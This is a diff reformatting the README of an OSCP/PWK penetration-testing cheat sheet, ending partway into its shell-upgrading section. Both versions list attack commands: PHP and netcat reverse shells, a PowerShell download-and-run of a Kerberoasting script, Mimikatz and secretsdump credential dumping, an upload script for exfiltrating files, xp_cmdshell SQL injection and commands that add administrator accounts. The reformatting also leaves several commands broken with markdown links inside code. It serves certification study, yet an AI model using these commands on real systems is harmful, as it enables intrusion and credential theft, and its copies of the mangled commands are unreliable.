@@ -1,86 +1,122 @@
 # JustTryHarder
 
-JustTryHarder, a cheat sheet which will aid you through the PWK course & the OSCP Exam.
+JustTryHarder is a cheat sheet which will aid you through the PWK course & the OSCP Exam.
 
-(Inspired by PayloadAllTheThings)
+*(Inspired by PayloadAllTheThings)*
 
 Feel free to submit a Pull Request & leave a star to share some love if this helped you. 💖
 
 **Hacktoberfest friendly!**
-Yes, we are open to Pull Requests for Hacktoberfest! Please ensure its not spam and actually contributes well to this repo. Thanks & happy hacking!
+Yes, we are open to Pull Requests for Hacktoberfest! Please ensure it is not spam and actually contributes well to this repo. Thanks & happy hacking!
 
-Disclaimer: None of the below includes spoilers for the PWK labs / OSCP Exam.
+> **Disclaimer:** None of the below includes spoilers for the PWK labs / OSCP Exam.
 
-Credit Info:
-I have obtained a lot of this info through other Github repos, blogs, sites and more.
-I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz
+### Credit Info
+I have obtained a lot of this info through other Github repos, blogs, sites and more. I have tried to give as much credit to the original creator as possible. If I have not given you credit, please contact me on Twitter: [https://twitter.com/s1nfulz](https://twitter.com/s1nfulz)
+
+## Table of Contents
+
+- [Determining the OS of a host via Ping](#determining-the-os-of-a-host-via-ping)
+- [BOF (WIP)](#bof-wip)
+- [Breakouts / Environment Escapes](#breakouts--environment-escapes)
+- [DNS - Zone Transfers](#dns---zone-transfers)
+- [File Transfers](#file-transfers)
+- [Kerberoasting](#kerberoasting)
+- [LFI / RFI](#lfi--rfi)
+- [MSSQL / SQLi](#mssql--sqli)
+- [Password Cracking](#password-cracking)
+- [Password Spraying (CrackMapExec)](#password-spraying-crackmapexec)
+- [Payload Generation](#payload-generation)
+- [PHP](#php)
+- [Priv Esc - Linux](#priv-esc---linux)
+- [Priv Esc - Windows](#priv-esc---windows)
+- [Post Exploitation](#post-exploitation)
+- [Port Forwarding](#port-forwarding)
+- [Socks Proxy (using PowerShell)](#socks-proxy-using-powershell)
+- [Port Scanning](#port-scanning)
+- [Ping Sweep](#ping-sweep)
+- [Pivoting](#pivoting)
+- [Remote Desktop](#remote-desktop)
+- [Responder](#responder)
+- [Reverse Shells](#reverse-shells)
+- [Shell Upgrading](#shell-upgrading)
+- [SQL Injection (SQLmap)](#sql-injection-sqlmap)
+- [Show listening ports](#show-listening-ports)
+- [SMB - Enumeration](#smb---enumeration)
+- [SMB - Impacket](#smb---impacket)
+- [SMTP Enumeration](#smtp-enumeration)
+- [ICMP Injection](#icmp-injection)
+- [VMware (not going full screen)](#vmware-not-going-full-screen)
+- [Web Servers](#web-servers)
+- [Web Scanning](#web-scanning)
+- [Web Shells](#web-shells)
+- [WordPress](#wordpress)
+- [Windows Framework / Powershell](#windows-framework--powershell)
+- [Windows Post Exploitation Commands](#windows-post-exploitation-commands)
+- [Writeable Directories](#writeable-directories)
+- [Todo List](#todo-list)
+- [Thank you](#thank-you)
+
+---
 
 ## Determining the OS of a host via Ping
 
----
-
-```
+```bash
 ping 10.10.10.110
 PING 10.10.10.110 (10.10.10.110) 56(84) bytes of data.
 64 bytes from 10.10.10.110: icmp_seq=1 ttl=128 time=166 ms
-```
+````
 
 The `TTL` can be used to determine the OS of the host. The three different types of TTL are as shown below:
 
--   TTL=64 = *nix - the hop count so if your getting 61 then there are 3 hops and its a *nix device. Most likely Linux.
--   TTL=128 = Windows - again if the TTL is 127 then the hop is 1 and its a Windows box.
--   TTL=254 = Solaris/AIX - again if the TTL is 250 then the hop count is 4 and its a Solaris box.
+  - **TTL=64** = \*nix - The hop count; so if you are getting 61, then there are 3 hops and it is a \*nix device. Most likely Linux.
+  - **TTL=128** = Windows - Again, if the TTL is 127 then the hop is 1 and it is a Windows box.
+  - **TTL=254** = Solaris/AIX - If the TTL is 250 then the hop count is 4 and it is a Solaris box.
 
 ## BOF (WIP)
 
----
+(Typical bad characters include: `0x00`, `0x0A`, `0x0D`)
 
-(Typical bad characters include: 0x00, 0x0A, 0x0D)
+  - Fuzzing
+  - Finding EIP position
+  - Finding bad chars
+  - Locating `jmp esp`
+  - Generating payload with `msfvenom`
+  - Getting reverse shell with `netcat`
 
--   Fuzzing
--   Finding eip position
--   Finding bad chars
--   Locating jmp esp
--   Generating payload with msfvenom
--   Getting reverse shell with netcat
+**Good BOF resources:**
 
-Good BOF resources:
-
--   https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/
--   https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
--   https://github.com/justinsteven/dostackbufferoverflowgood
--   https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/
+  - [NCC Group - Writing Exploits for Win32](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
+  - [Corelan - Exploit Writing Tutorial Part 1](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
+  - [GitHub - dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
+  - [VeteranSec - 32-bit Windows Buffer Overflows Made Easy](https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/)
 
 ## Breakouts / Environment Escapes
 
----
-
--   https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/
--   https://sra.io/blog/sitekiosk-breakout/
--   https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/
--   https://cognosec.com/breaking-out-of-citrix-environment/
--   https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/
--   https://research.nccgroup.com/wp-content/uploads/2020/07/research-insights_common-issues-with-environment-breakouts.pdf
--   https://gracefulsecurity.com/citrix-breakout/
+  - [Pentest Partners - Breaking out of Citrix](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
+  - [SRA.io - SiteKiosk Breakout](https://sra.io/blog/sitekiosk-breakout/)
+  - [TrustedSec - Kiosk/POS Breakout Keys](https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/)
+  - [Cognosec - Breaking out of Citrix Environment](https://cognosec.com/breaking-out-of-citrix-environment/)
+  - [NetSPI - Breaking out of Applications](https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/)
+  - [NCC Group - Common Issues with Environment Breakouts (PDF)](https://research.nccgroup.com/wp-content/uploads/2020/07/research-insights_common-issues-with-environment-breakouts.pdf)
+  - [GracefulSecurity - Citrix Breakout](https://gracefulsecurity.com/citrix-breakout/)
 
 ## DNS - Zone Transfers
 
----
-
--   host -t axfr HTB.local 10.10.10.10
--   host -l HTB.local 10.10.10.10
--   host -l <domain name> <name server>
--   dig @<dns server> <domain> axfr
+```bash
+host -t axfr HTB.local 10.10.10.10
+host -l HTB.local 10.10.10.10
+host -l <domain name> <name server>
+dig @<dns server> <domain> axfr
+```
 
 ## File Transfers
 
----
-
 ### SMB Transfer
 
-On the Victim machine (Windows)
+On the Victim machine (Windows):
 
-```
+```cmd
 net share \\10.10.10.10\myshare
 net use x:
 copy whatever.zip x:
@@ -88,174 +124,184 @@ copy whatever.zip x:
 
 ### Wget Transfer
 
-How to retrieve file(s) from host (inside a reverse shell)
+How to retrieve file(s) from host (inside a reverse shell).
+
+**Setup:** Place file you want transferred in `/var/www/html/` and run `service apache2 start`.
+
+Run on the remote server:
 
 ```bash
-# Place file you want transferred in /var/www/html/
-service apache2 start
-# Run on the remote server
-# wget http://10.10.10.10/pspy64 # <- for single file
-# wget -r http://10.10.10.10/pspy64/ <- for folder
+wget [http://10.10.10.10/pspy64](http://10.10.10.10/pspy64)       # <- for single file
+wget -r [http://10.10.10.10/pspy64/](http://10.10.10.10/pspy64/)   # <- for folder
 ```
 
 ### TFTP Transfer
 
-(How to transfer from Kali to Windows)
+(How to transfer from Kali to Windows).
 
-Using MSF.
-
+**Using MSF:**
 Start MSF before these steps:
 
-Inside MSF
+1.  `use auxiliary/server/tftp`
+2.  `set TFTPROOT /usr/share/mimikatz/Win32/`
+3.  `run`
 
-1. `use auxiliary/server/tftp`
-2. `set TFTPROOT /usr/share/mimikatz/Win32/`
-3. `run`
-
-Inside a terminal
-
-4. `tftp -i 10.10.10.10 GET mimikatz.exe`
+**Inside a terminal:**
+4\. `tftp -i 10.10.10.10 GET mimikatz.exe`
 
 ### NetCat (Windows to Kali)
 
-1. Windows: `nc -nv 10.11.0.61 4444 < bank-account.zip`
-
-2. Linux: `nc -nlvp 4444 > bank-account.zip`
+1.  **Windows:** `nc -nv 10.11.0.61 4444 < bank-account.zip`
+2.  **Linux:** `nc -nlvp 4444 > bank-account.zip`
 
 ### PowerShell
 
-```ps
-Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
+Interactive session:
+
+```powershell
+Invoke-WebRequest -Uri [http://127.0.0.1/exploit.py](http://127.0.0.1/exploit.py) -OutFile C:\Users\Victim\exploit.py
 ```
 
-Without an interactive powershell session:
+Without an interactive PowerShell session (Create `wget.ps1`):
 
-```ps
-# Create wget.ps1
+```powershell
 $client = New-Object System.Net.WebClient
 $path = "C:\path\to\save\file.txt"
 $client.DownloadFile($url, $path)
 ```
 
-### Base64 (Linux -> Linux)
+### Base64 (Linux -\> Linux)
 
-Local Host:
+**Local Host:**
 
-1. `$(echo "cat /path/to/exploit.py | base64") > encoded.b64`
-2. Transfer `encoded.b64` to the remote server via `nc` or otherwise.
+1.  `$(echo "cat /path/to/exploit.py | base64") > encoded.b64`
+2.  Transfer `encoded.b64` to the remote server via `nc` or otherwise.
 
-Remote Server - Linux:
-
-3. `cat /path/to/encoded.b64 | base64 -d > exploit.py`
-
-Remove Server - Powershell
+**Remote Server - Linux:**
+3\. `cat /path/to/encoded.b64 | base64 -d > exploit.py`
 
 ### Certutil
 
-```
-certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
+```cmd
+certutil.exe -urlcache -split -f "[http://ip.for.kali.box/file-to-get.zip](http://ip.for.kali.box/file-to-get.zip)" name-to-save-as.zip
 ```
 
 ### HTTP File Upload (Exfiltration)
 
-Upload:
-
-1. Create upload.php file in attacking machine webroot, `/var/www/html` by default.
+**1. Create upload.php**
+Create in attacking machine webroot (`/var/www/html` by default).
 
 ```php
 <?php
 $uploaddir = '/var/www/uploads/';
-
 $uploadfile = $uploaddir . $_FILES['file']['name'];
-
 move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
 ?>
 ```
 
-2. Create upload directory and set appropriate permissions to allow upload.
+**2. Create directory**
+Create upload directory and set appropriate permissions to allow upload.
 
 ```bash
 sudo mkdir /var/www/uploads && sudo chown www-data:www-data /var/www/uploads
 ```
 
-3. Upload file from victim machine to attacking machine using PowerShell:
+**3. Upload file**
+Upload file from victim machine to attacking machine using PowerShell:
 
-```ps
-powershell.exe -exec unrestricted -noprofile -Command "(New-Object System.Net.WebClient).UploadFile('http://10.10.10.10/upload.php', 'file-to-upload.txt')"
+```powershell
+powershell.exe -exec unrestricted -noprofile -Command "(New-Object System.Net.WebClient).UploadFile('[http://10.10.10.10/upload.php](http://10.10.10.10/upload.php)', 'file-to-upload.txt')"
 ```
 
 ## Kerberoasting
 
--   `GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>`
-
--   `powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat`
-
--   `impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER> -outputfile filename.hashes`
+  - `GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>`
+  - `powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat`
+  - `impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER> -outputfile filename.hashes`
 
 ## LFI / RFI
 
-PHP Reverse Shell:
+**PHP Reverse Shell:**
 
-<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");
+```php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'"); ?>
+```
 
-Command Injection:
+**Command Injection:**
+
+```php
 <?php echo shell_exec(whoami);?>
-
--   For more info on LFI & RFI please refer to the LFI / RFI section at the top of the page ^
+```
 
 ## MSSQL / SQLi
 
--   EXEC master..xp_cmdshell 'whoami';
--   meh' exec master..xp_cmdshell 'whoami' --
--   https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md
--   http://pentestmonkey.net/category/cheat-sheet/sql-injection
+  - `EXEC master..xp_cmdshell 'whoami';`
+  - `' exec master..xp_cmdshell 'whoami' --`
+  - [OSCP-2 SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
+  - [PentestMonkey SQL Injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
 
 ## Password Cracking
 
-Hashcat
+**Hashcat**
 
--   `hashcat -m 500 -a 0 -o cracked_password.txt --force hash.txt /path/to/your/wordlist.txt`
+```bash
+hashcat -m 500 -a 0 -o cracked_password.txt --force hash.txt /path/to/your/wordlist.txt
+```
 
-John The Ripper
+**John The Ripper**
 
--   `john --rules --wordlist=/path/to/your/wordlist.txt hash.txt`
+```bash
+john --rules --wordlist=/path/to/your/wordlist.txt hash.txt
+```
 
 ## Password Spraying (CrackMapExec)
 
--   `cme smb 10.10.10.10 -u username -d domain -p password`
+```bash
+cme smb 10.10.10.10 -u username -d domain -p password
+```
 
 ## Payload Generation
 
--   [NETSEC - Creating Payloads](https://netsec.ws/?p=331)
--   [MsfVenom Cheatsheet](http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/_)
--   [Metasploit Unleashed Payloads](https://www.offensive-security.com/metasploit-unleashed/payloads/)
--   [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
--   Non-staged: netcat
--   Staged: multi/handler
+  - [NETSEC - Creating Payloads](https://netsec.ws/?p=331)
+  - [MsfVenom Cheatsheet](https://www.google.com/search?q=http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/_)
+  - [Metasploit Unleashed Payloads](https://www.offensive-security.com/metasploit-unleashed/payloads/)
+  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+
+**Types:**
+
+  - Non-staged: `netcat`
+  - Staged: `multi/handler`
 
 ## PHP
 
--   [The differences between `exec()`, `shell_exec`, `system()` and `passthru()`](https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1)
+  - [The differences between exec(), shell\_exec, system() and passthru()](https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1)
 
 ## Priv Esc - Linux
 
-# If GCC & wget is installed, the system MIGHT be vulnerable to a kernel exploit
+**Note:** If GCC & wget are installed, the system MIGHT be vulnerable to a kernel exploit.
 
--   [Linux Kernel Exploits](https://github.com/SecWiki/linux-kernel-exploits)
--   [GTFObins - Break ~~the f\*\*k~~ out of restricted shells](https://gtfobins.github.io)
-    -   GTFO Helper script: https://github.com/dreadnaughtsec/gtfo
--   [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
--   [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
--   [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
--   `grep -Ri 'password' .`
--   `find / -perm –4000 2>/dev/null`
--   `find / -perm -u=s 2>/dev/null`
--   `find / -user root -perm -4000 -exec ls -ldb {} \;`
--   `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
-    (then ls -la, look for 777 file permissions).
--   Custom SUID binary. Requires code execution as the target user. Example: mysql sys_eval as root.
+  - [Linux Kernel Exploits](https://github.com/SecWiki/linux-kernel-exploits)
+  - [GTFObins - Break out of restricted shells](https://gtfobins.github.io)
+      - GTFO Helper script: [https://github.com/dreadnaughtsec/gtfo](https://github.com/dreadnaughtsec/gtfo)
+  - [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
+  - [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
+  - [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 
+**Enumeration Commands:**
+
+```bash
+grep -Ri 'password' .
+find / -perm –4000 2>/dev/null
+find / -perm -u=s 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+# (then ls -la, look for 777 file permissions)
 ```
+
+**Custom SUID binary:**
+Requires code execution as the target user. Example: mysql sys\_eval as root.
+
+```c
 #include<stdio.h>
 #include<unistd.h>
 #include<sys/types.h>
@@ -269,152 +315,173 @@ int main(){
 
 ## Priv Esc - Windows
 
--   [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
--   [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
--   [PowerUp / PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
--   [Powerless - Enumeration Tool](https://github.com/M4ximuss/Powerless)
--   [Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
--   [Just Another Windows (Enum) Script / JAWS](https://github.com/411Hall/JAWS)
--   [Watson](https://github.com/rasta-mouse/Watson)
--   [Sherlock](https://github.com/rasta-mouse/Sherlock) (Deprecated)
--   [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
--   `churrasco -d "net user /add <username> <password>"`
--   `churrasco -d "net localgroup administrators <username> /add"`
--   `churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"`
+  - [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
+  - [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
+  - [PowerUp / PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+  - [Powerless - Enumeration Tool](https://github.com/M4ximuss/Powerless)
+  - [Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
+  - [Just Another Windows (Enum) Script / JAWS](https://github.com/411Hall/JAWS)
+  - [Watson](https://github.com/rasta-mouse/Watson)
+  - [Sherlock (Deprecated)](https://github.com/rasta-mouse/Sherlock)
+  - [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+
+**Commands:**
+
+  - `churrasco -d "net user /add <username> <password>"`
+  - `churrasco -d "net localgroup administrators <username> /add"`
+  - `churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"`
 
 ## Post Exploitation
 
-1. Mimikatz.exe (run it)
-2. privilege::debug
-3. sekurlsa::logonpasswords
+1.  `Mimikatz.exe` (run it)
+2.  `privilege::debug`
+3.  `sekurlsa::logonpasswords`
 
 ## Port Forwarding
 
-```
-• Local -- Forward local port to remote host.
-• Remote -- Forward remote port to local host.
-• Dynamic -- Use SOCKS.
+> **Local:** Forward local port to remote host.
+> Use local if you have a service running on a machine that can be reached from the remote machine, and you want to access it directly from the local machine.
+>
+> **Remote:** Forward remote port to local host.
+> Use remote if you have a service that can be reached from the local machine, and you need to make it available to the remote machine. It opens the listening socket on the machine you have used SSH to log into.
+>
+> **Dynamic:** Use SOCKS.
+> Dynamic is like local, but on the client side it behaves like a SOCKS proxy. Use it if you need to connect with a software that expects SOCKS forwarding.
 
-Use local if you have a service running on a machine that can be reached from the remote machine, and you want to access it directly from the local machine. After setting up the tunneling you will be able to access the service using your local host IP (127.0.0.1)
+### Chisel
 
-Use remote if you have a service that can be reached from the local machine, and you need to make it available to the remote machine. It opens the listening socket on the machine you have used SSH to log into. 
+**Local system:**
 
-Dynamic is like local, but on the client side it behaves like a SOCKS proxy. Use it if you need to connect with a software that expects SOCKS forwarding.
-```
-
-Chisel
-local system:
-
-```
+```bash
 ./chisel server -p 8080 --reverse
 ```
 
-victim:
+**Victim:**
 
-```
+```bash
 ./chisel client YOUR_IP:8080 R:1234:127.0.0.1:1234
 ```
 
-Plink
+### SSH
 
--   WIP
+1.  **Generate an SSH key pair** on the box being pivoted through to protect your credentials.
 
-SSH
+<!-- end list -->
 
-1. Generate an SSH key pair on the box being pivoted through to protect your credentials.
-
-```
+```bash
 ssh-keygen
 cat ~/.ssh/id_rsa.pub
 ```
 
-2. Copy the pulic key output from the above command. Add this value and the pivot machine's IP address to the `~/.ssh/authorized_keys` file on your attacking (Kali) machine using the syntax below. If you do not already have this file, simple create a new file and add the contents below.
+2.  **Copy the public key**. Add this value and the pivot machine's IP address to the `~/.ssh/authorized_keys` file on your attacking (Kali) machine using the syntax below.
+
+<!-- end list -->
 
 ```
 from="[VICTIM_MACHINE_IP_ADDRESS]",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty [PUBLIC_KEY_VALUE]
 ```
 
-3. Ensure the SSH service is running on your attacking (Kali) machine.
+3.  **Ensure the SSH service is running** on your attacking (Kali) machine.
 
-```
+<!-- end list -->
+
+```bash
 sudo service ssh start
 ```
 
-4. Initiate SSH call from the box being pivoted through and specify the `id_rsa` private key generated in step 1. This private key may be called something else if you changed the name when generating. Ensure the username and IP address of your attacking machine are correct.
+4.  **Initiate SSH call** from the box being pivoted through and specify the `id_rsa` private key generated in step 1.
 
-```
+<!-- end list -->
+
+```bash
 ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /[PATH_TO_YOUR_PRIVATE_KEY]/id_rsa kali@[ATTACKING_MACHINE_IP]
 ```
 
-5. Edit your `/etc/proxychains.conf` file to add the line below.
+5.  **Edit your proxychains config**: `/etc/proxychains.conf`
+
+<!-- end list -->
 
 ```
 socks4 127.0.0.1 1080
 ```
 
-6. Prepend the `proxychains` command to pivot through the compromised host using proxy chains. When scanning with `nmap`, be sure to use TCP Connect scans e.g.
+6.  **Run proxychains**. When scanning with `nmap`, be sure to use TCP Connect scans.
 
-```
+<!-- end list -->
+
+```bash
 sudo proxychains nmap -sT -p80 -sC -sV --open -Pn -n 10.10.10.10
 ```
 
-Additional Notes:
+**Additional Notes:**
 
--   ssh user@10.10.10.10 -R 1234:127.0.0.1:1234
--   ssh -D 1337 -q -C -N -f user@10.10.10.10 (https://ma.ttias.be/socks-proxy-linux-ssh-bypass-content-filters)
+  - `ssh user@10.10.10.10 -R 1234:127.0.0.1:1234`
+  - `ssh -D 1337 -q -C -N -f user@10.10.10.10` ([Source](https://ma.ttias.be/socks-proxy-linux-ssh-bypass-content-filters))
 
 ## Socks Proxy (using PowerShell)
 
-Local
+**Local:**
 
--   vi /etc/proxychains.conf
--   socks5 <ip> 9080
--   Import-Module .\Invoke-SocksProxy.psm1
--   Invoke-SocksProxy -bindPort 9080
--   proxychains nmap -sT <ip>
+  - `vi /etc/proxychains.conf` -\> `socks5 <ip> 9080`
+  - `Import-Module .\Invoke-SocksProxy.psm1`
+  - `Invoke-SocksProxy -bindPort 9080`
+  - `proxychains nmap -sT <ip>`
 
 ## Port Scanning
 
-TCP
+### TCP
 
--   reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
--   nmap -vvv -sC -sV -p- --min-rate 2000 10.10.10.10
--   nmap -sT -p 22,80,110 -A
--   nmap -p- -iL ips.txt > TCP_Ports.txt
--   nc -v -n -z -w1 10.10.10.10 1-10000
--   nmap -p- -iL ips.txt > AllTCPPorts.txt
+```bash
+reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
+nmap -vvv -sC -sV -p- --min-rate 2000 10.10.10.10
+nmap -sT -p 22,80,110 -A
+nmap -p- -iL ips.txt > TCP_Ports.txt
+nc -v -n -z -w1 10.10.10.10 1-10000
+nmap -p- -iL ips.txt > AllTCPPorts.txt
+```
 
-UDP (can take hours so maybe netstat is a better alternative)
+### UDP
 
--   nmap -sU --top-ports 10000
--   nmap -sT -sU -p 22,80,110 -A
--   nmap -sT -sU -p- --min-rate 2000
--   nmap -p- -sU -iL ips.txt > udp.txt
--   nmap -sU -sV -iL ips.txt > alludpports.txt
+(Can take hours, `netstat` is a better alternative if you have shell).
 
-SNMP
-nmap -p161 -sU -iL ips.txt > udp.txt (cmd could be wrong, double check)
+```bash
+nmap -sU --top-ports 10000
+nmap -sT -sU -p 22,80,110 -A
+nmap -sT -sU -p- --min-rate 2000
+nmap -p- -sU -iL ips.txt > udp.txt
+nmap -sU -sV -iL ips.txt > alludpports.txt
+```
 
-SSH
-nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt
+### Other Protocols
 
-SSL
-nmap -v -v --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt
+**SNMP:**
+`nmap -p161 -sU -iL ips.txt > udp.txt`
 
-NMAP Bootstrap Report
+**SSH:**
+`nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt`
+
+**SSL:**
+`nmap -v -v --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt`
+
+**NMAP Bootstrap Report:**
+
+```bash
 nmap -oA poison --stylesheet nmap-bootstrap.xsl 10.10.10.10
 firefox nmap-bootstrap.xsl
+```
 
 ## Ping Sweep
 
-# Linux (basic one liners)
+### Linux (One-liners)
 
--   for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
--   fping -g 192.168.0.1/24
-
-# Linux (script)
-
+```bash
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+fping -g 192.168.0.1/24
 ```
+
+### Linux (Script)
+
+```bash
 for i in `seq 1 255`
 do
     ping -c1 192.168.125.$i 2>/dev/null 1>&2
@@ -425,264 +492,291 @@ do
 done
 ```
 
-# Windows (cmd)
+### Windows (CMD)
 
--   for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
+```cmd
+for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
+```
 
-# Windows (PowerShell)
+### Windows (PowerShell)
 
--   $ping = New-Object System.Net.Networkinformation.Ping ; 1..254 | % { $ping.send("10.9.15.$\_", 1) | where status -ne 'TimedOut' | select Address | fl \* }
+```powershell
+$ping = New-Object System.Net.Networkinformation.Ping ; 1..254 | % { $ping.send("10.9.15.$_", 1) | where status -ne 'TimedOut' | select Address | fl * }
+```
 
-# Nmap
+### Nmap
 
--   nmap -sP 192.168.0.1-254
+```bash
+nmap -sP 192.168.0.1-254
+```
 
 ## Pivoting
 
--   sshuttle -r user@10.10.10.10 10.1.1.0/24
+  - `sshuttle -r user@10.10.10.10 10.1.1.0/24`
 
 ## Remote Desktop
 
--   rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/
--   xfreerdp /d:xyz.local /u:username /p:password /v:10.10.10.10 /cert-ignore
+  - `rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/`
+  - `xfreerdp /d:xyz.local /u:username /p:password /v:10.10.10.10 /cert-ignore`
 
 ## Responder
 
--   responder -I tun0 -wrF
--   https://chryzsh.gitbooks.io/darthsidious/content/execution/responder-with-ntlm-relay-and-empire.html
--   https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
+  - `responder -I tun0 -wrF`
+  - [Responder with NTLM Relay and Empire](https://chryzsh.gitbooks.io/darthsidious/content/execution/responder-with-ntlm-relay-and-empire.html)
+  - [Practical Guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
 
 ## Reverse Shells
 
-Linux
+**Linux:**
 
--   http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
--   https://awansec.com/reverse-shell.html
--   https://www.revshells.com/
+  - [PentestMonkey - Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+  - [Awansec - Reverse Shell](https://awansec.com/reverse-shell.html)
+  - [RevShells.com](https://www.revshells.com/)
 
-Windows
+**Windows:**
 
--   https://github.com/Dhayalanb/windows-php-reverse-shell
--   nc 10.10.10.10 4444 –e cmd.exe
--   https://www.revshells.com/
+  - [GitHub - Windows PHP Reverse Shell](https://github.com/Dhayalanb/windows-php-reverse-shell)
+  - `nc 10.10.10.10 4444 –e cmd.exe`
 
 ## Shell Upgrading
 
-Source: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ & https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell
+Source: [Ropnop Blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) & [HTB Forum](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
 
-## SQL Injection (SQLmap)
+### Python
 
--   sqlmap -u "http://example.com/test.php?test=test" --level=5 --risk=3 --batch
